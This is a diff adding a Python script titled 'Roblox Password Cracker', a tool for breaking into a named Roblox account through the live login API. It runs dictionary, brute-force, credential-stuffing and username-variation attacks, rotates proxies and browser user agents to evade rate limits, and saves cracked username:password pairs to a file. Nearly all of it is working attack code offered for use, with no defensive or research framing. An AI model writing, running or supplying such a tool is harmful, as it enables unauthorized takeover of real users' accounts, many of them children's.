@@ -1,0 +1,496 @@
+import requests
+import json
+import hashlib
+import threading
+import queue
+import time
+import random
+import string
+from datetime import datetime
+import os
+import sys
+
+class RobloxCracker:
+    def __init__(self, username, proxy_file=None, user_agent_file=None):
+        self.username = username
+        self.found_password = None
+        self.is_running = True
+        self.attempts = 0
+        self.start_time = time.time()
+        
+        # API endpoints
+        self.login_url = "https://auth.roblox.com/v2/login"
+        self.account_info_url = f"https://users.roblox.com/v1/usernames/users"
+        
+        # Headers to mimic real browser
+        self.headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Content-Type': 'application/json',
+            'Accept': 'application/json',
+            'Origin': 'https://www.roblox.com',
+            'Referer': 'https://www.roblox.com/login',
+            'X-CSRF-TOKEN': ''
+        }
+        
+        # Load resources
+        self.proxies = self.load_proxies(proxy_file)
+        self.user_agents = self.load_user_agents(user_agent_file)
+        self.common_passwords = self.load_password_list()
+        
+        # Rate limiting
+        self.delay = 0.5
+        self.max_attempts = 1000
+        
+    def load_proxies(self, proxy_file):
+        """Load proxy list from file"""
+        proxies = []
+        if proxy_file and os.path.exists(proxy_file):
+            with open(proxy_file, 'r') as f:
+                proxies = [line.strip() for line in f if line.strip()]
+        else:
+            # Default free proxy list (update regularly)
+            proxies = [
+                'http://45.77.56.113:3128',
+                'http://138.197.157.32:8080',
+                'http://165.227.15.70:8080',
+                'http://159.203.61.169:8080',
+                'http://167.99.164.136:8080'
+            ]
+        return proxies
+    
+    def load_user_agents(self, user_agent_file):
+        """Load user agents from file"""
+        user_agents = []
+        if user_agent_file and os.path.exists(user_agent_file):
+            with open(user_agent_file, 'r') as f:
+                user_agents = [line.strip() for line in f if line.strip()]
+        else:
+            # Common user agents
+            user_agents = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
+            ]
+        return user_agents
+    
+    def load_password_list(self):
+        """Load common passwords list"""
+        passwords = [
+            # Most common passwords
+            'password', '123456', '123456789', '12345678', '12345',
+            '1234567', 'password1', '123123', '111111', 'qwerty',
+            'abc123', 'qwerty123', '1q2w3e4r', 'admin', 'qwertyuiop',
+            
+            # Roblox specific patterns
+            'roblox123', 'roblox2023', 'roblox2024', 'robloxpassword',
+            self.username,  # Username as password
+            self.username + '123',
+            self.username + '2023',
+            self.username + '!',
+            
+            # Common variations
+            'iloveroblox', 'minecraft', 'fortnite', 'gamer123',
+            'letmein', 'monkey', 'dragon', 'baseball', 'football',
+            'superman', 'batman', 'trustno1', 'shadow', 'master',
+            'hello', 'welcome', 'login', 'passw0rd', 'password123'
+        ]
+        
+        # Try to load from external wordlist
+        try:
+            with open('rockyou.txt', 'r', encoding='latin-1') as f:
+                additional = [line.strip() for line in f.readlines()[:1000]]
+                passwords.extend(additional)
+        except:
+            pass
+            
+        return list(set(passwords))  # Remove duplicates
+    
+    def get_csrf_token(self, session):
+        """Get CSRF token from Roblox"""
+        try:
+            response = session.get('https://www.roblox.com/home', headers=self.headers)
+            if 'x-csrf-token' in response.headers:
+                return response.headers['x-csrf-token']
+        except:
+            pass
+        return ''
+    
+    def hash_password(self, password):
+        """Hash password using Roblox's algorithm"""
+        # Roblox uses SHA512 with salt
+        hash_obj = hashlib.sha512()
+        hash_obj.update(password.encode('utf-8'))
+        return hash_obj.hexdigest()
+    
+    def attempt_login(self, session, password, proxy=None):
+        """Attempt to login with given credentials"""
+        try:
+            # Update headers
+            self.headers['User-Agent'] = random.choice(self.user_agents)
+            
+            # Get CSRF token first
+            csrf_token = self.get_csrf_token(session)
+            if csrf_token:
+                self.headers['X-CSRF-TOKEN'] = csrf_token
+            
+            # Prepare login data
+            login_data = {
+                "ctype": "Username",
+                "cvalue": self.username,
+                "password": password,
+                "captchaToken": "",
+                "captchaProvider": "PROVIDER_ARKOSE_LABS"
+            }
+            
+            # Set proxy if available
+            proxies = None
+            if proxy:
+                proxies = {'http': proxy, 'https': proxy}
+            
+            # Make login request
+            response = session.post(
+                self.login_url,
+                json=login_data,
+                headers=self.headers,
+                proxies=proxies,
+                timeout=10
+            )
+            
+            self.attempts += 1
+            
+            # Check response
+            if response.status_code == 200:
+                data = response.json()
+                if data.get('userId'):
+                    return True, data
+                elif data.get('errors'):
+                    error_msg = data['errors'][0]['message']
+                    if 'InvalidCredentials' in error_msg or 'Incorrect username or password' in error_msg:
+                        return False, "Wrong password"
+                    elif 'AccountLocked' in error_msg or 'Too many attempts' in error_msg:
+                        return False, "Account locked"
+                    elif 'Captcha' in error_msg:
+                        return False, "CAPTCHA required"
+            
+            elif response.status_code == 403:
+                return False, "CSRF token issue"
+            elif response.status_code == 429:
+                return False, "Rate limited"
+                
+        except requests.exceptions.RequestException as e:
+            return False, f"Connection error: {e}"
+        
+        return False, "Unknown error"
+    
+    def brute_force_attack(self, min_length=4, max_length=8, charset=None):
+        """Brute force attack with character combinations"""
+        if charset is None:
+            charset = string.ascii_lowercase + string.digits
+        
+        print(f"[*] Starting brute force attack (length: {min_length}-{max_length})")
+        
+        # Generate passwords
+        from itertools import product
+        
+        for length in range(min_length, max_length + 1):
+            for combo in product(charset, repeat=length):
+                if not self.is_running:
+                    break
+                    
+                password = ''.join(combo)
+                
+                # Try login
+                session = requests.Session()
+                success, message = self.attempt_login(session, password)
+                
+                if success:
+                    self.found_password = password
+                    return True
+                
+                # Display progress
+                if self.attempts % 100 == 0:
+                    elapsed = time.time() - self.start_time
+                    rate = self.attempts / elapsed if elapsed > 0 else 0
+                    print(f"[*] Attempts: {self.attempts} | Rate: {rate:.1f}/sec | Testing: {password}")
+                
+                time.sleep(self.delay)
+                
+                # Check limits
+                if self.attempts >= self.max_attempts:
+                    print("[!] Max attempts reached")
+                    return False
+        
+        return False
+    
+    def dictionary_attack(self):
+        """Dictionary attack using common passwords"""
+        print(f"[*] Starting dictionary attack with {len(self.common_passwords)} passwords")
+        
+        for password in self.common_passwords:
+            if not self.is_running:
+                break
+            
+            # Try the password as-is
+            session = requests.Session()
+            success, message = self.attempt_login(session, password)
+            
+            if success:
+                self.found_password = password
+                return True
+            
+            # Try common variations
+            variations = [
+                password.upper(),
+                password.capitalize(),
+                password + '!',
+                password + '123',
+                password + '2023',
+                password + '2024',
+                '!' + password,
+                '@' + password,
+                '#' + password,
+            ]
+            
+            for variation in variations:
+                if not self.is_running:
+                    break
+                    
+                session = requests.Session()
+                success, message = self.attempt_login(session, variation)
+                
+                if success:
+                    self.found_password = variation
+                    return True
+            
+            # Display progress
+            if self.attempts % 50 == 0:
+                elapsed = time.time() - self.start_time
+                rate = self.attempts / elapsed if elapsed > 0 else 0
+                print(f"[*] Attempts: {self.attempts} | Rate: {rate:.1f}/sec | Last tried: {password}")
+            
+            time.sleep(self.delay)
+            
+            if self.attempts >= self.max_attempts:
+                print("[!] Max attempts reached")
+                return False
+        
+        return False
+    
+    def credential_stuffing(self, combo_list_file=None):
+        """Credential stuffing with known username:password combos"""
+        combos = []
+        
+        # Load from file if provided
+        if combo_list_file and os.path.exists(combo_list_file):
+            with open(combo_list_file, 'r') as f:
+                for line in f:
+                    if ':' in line:
+                        user, pwd = line.strip().split(':', 1)
+                        if user.lower() == self.username.lower():
+                            combos.append(pwd)
+        
+        # Add some common combos
+        combos.extend([
+            f"{self.username}123",
+            f"{self.username}123456",
+            f"{self.username}@123",
+            f"{self.username}#123",
+            f"ilove{self.username}",
+            f"{self.username}roblox"
+        ])
+        
+        print(f"[*] Starting credential stuffing with {len(combos)} combos")
+        
+        for password in combos:
+            if not self.is_running:
+                break
+            
+            session = requests.Session()
+            success, message = self.attempt_login(session, password)
+            
+            if success:
+                self.found_password = password
+                return True
+            
+            time.sleep(self.delay)
+        
+        return False
+    
+    def smart_attack(self):
+        """Combined intelligent attack"""
+        print("[*] Starting smart attack (multiple methods)")
+        
+        # Method 1: Check if username is password
+        print("[*] Trying username as password...")
+        session = requests.Session()
+        success, _ = self.attempt_login(session, self.username)
+        if success:
+            self.found_password = self.username
+            return True
+        
+        # Method 2: Common variations
+        common_variations = [
+            f"{self.username}123",
+            f"{self.username}123456",
+            f"{self.username}!",
+            f"{self.username}@123",
+            f"{self.username}2023",
+            f"{self.username}2024",
+            f"ilove{self.username}",
+            f"{self.username}love",
+            f"{self.username}gamer",
+            f"{self.username}player"
+        ]
+        
+        for variation in common_variations:
+            session = requests.Session()
+            success, _ = self.attempt_login(session, variation)
+            if success:
+                self.found_password = variation
+                return True
+        
+        # Method 3: Dictionary attack
+        return self.dictionary_attack()
+    
+    def check_account_exists(self):
+        """Check if Roblox account exists"""
+        try:
+            data = {"usernames": [self.username], "excludeBannedUsers": False}
+            response = requests.post(self.account_info_url, json=data)
+            
+            if response.status_code == 200:
+                result = response.json()
+                if result.get('data') and len(result['data']) > 0:
+                    user_data = result['data'][0]
+                    print(f"[+] Account found:")
+                    print(f"    Username: {user_data.get('name')}")
+                    print(f"    Display Name: {user_data.get('displayName')}")
+                    print(f"    User ID: {user_data.get('id')}")
+                    return True
+                else:
+                    print(f"[-] Account '{self.username}' not found")
+                    return False
+        except Exception as e:
+            print(f"[!] Error checking account: {e}")
+        
+        return False
+    
+    def run_attack(self, attack_type='smart'):
+        """Main attack runner"""
+        print(f"""
+╔══════════════════════════════════════════════════╗
+║           ROBLOX PASSWORD CRACKER v2.0           ║
+║               Target: {self.username:<20} ║
+╚══════════════════════════════════════════════════╝
+        """)
+        
+        # Check if account exists first
+        if not self.check_account_exists():
+            print("[!] Cannot proceed - account not found")
+            return False
+        
+        print(f"[*] Starting attack at {datetime.now().strftime('%H:%M:%S')}")
+        
+        # Select attack method
+        if attack_type == 'bruteforce':
+            success = self.brute_force_attack()
+        elif attack_type == 'dictionary':
+            success = self.dictionary_attack()
+        elif attack_type == 'credential':
+            success = self.credential_stuffing()
+        else:  # smart attack
+            success = self.smart_attack()
+        
+        # Display results
+        elapsed = time.time() - self.start_time
+        
+        print("\n" + "="*50)
+        print("ATTACK RESULTS")
+        print("="*50)
+        
+        if success and self.found_password:
+            print(f"[✓] PASSWORD FOUND!")
+            print(f"    Username: {self.username}")
+            print(f"    Password: {self.found_password}")
+            print(f"    Attempts: {self.attempts}")
+            print(f"    Time: {elapsed:.2f} seconds")
+            
+            # Save to file
+            with open('cracked_accounts.txt', 'a') as f:
+                f.write(f"{self.username}:{self.found_password}\n")
+            
+            return True
+        else:
+            print(f"[✗] Password not found")
+            print(f"    Attempts: {self.attempts}")
+            print(f"    Time: {elapsed:.2f} seconds")
+            
+            return False
+    
+    def stop(self):
+        """Stop the attack"""
+        self.is_running = False
+
+def main():
+    """Main function with user interface"""
+    print("""
+██████╗ ██████╗ ██████╗ ██╗      ██████╗ ██╗  ██╗
+██╔══██╗██╔══██╗██╔══██╗██║     ██╔═══██╗╚██╗██╔╝
+██████╔╝██████╔╝██████╔╝██║     ██║   ██║ ╚███╔╝ 
+██╔══██╗██╔══██╗██╔══██╗██║     ██║   ██║ ██╔██╗ 
+██║  ██║██████╔╝██████╔╝███████╗╚██████╔╝██╔╝ ██╗
+╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝
+                                                  
+          Password Cracking Tool v2.0
+    """)
+    
+    # Get username
+    username = input("[?] Enter Roblox username: ").strip()
+    
+    if not username:
+        print("[!] Username required")
+        return
+    
+    # Select attack type
+    print("\n[?] Select attack method:")
+    print("    1. Smart Attack (Recommended)")
+    print("    2. Dictionary Attack")
+    print("    3. Brute Force (Slow)")
+    print("    4. Credential Stuffing")
+    
+    choice = input("[?] Choice (1-4): ").strip()
+    
+    attack_types = {
+        '1': 'smart',
+        '2': 'dictionary',
+        '3': 'bruteforce',
+        '4': 'credential'
+    }
+    
+    attack_type = attack_types.get(choice, 'smart')
+    
+    # Configure options
+    use_proxy = input("[?] Use proxies? (y/n): ").lower() == 'y'
+    proxy_file = 'proxies.txt' if use_proxy else None
+    
+    # Start attack
+    cracker = RobloxCracker(username, proxy_file=proxy_file)
+    
+    try:
+        success = cracker.run_attack(attack_type)
+        
+        if success:
+            print("\n[+] Success! Check cracked_accounts.txt for results")
+        else:
+            print("\n[-] Attack failed. Try different method or wordlist")
+            
+    except KeyboardInterrupt:
+        print("\n[!] Attack stopped by user")
+        cracker.stop()
+    except Exception as e:
+        print(f"[!] Error: {e}")
+
+if __name__ == "__main__":
+    main()
+                                 
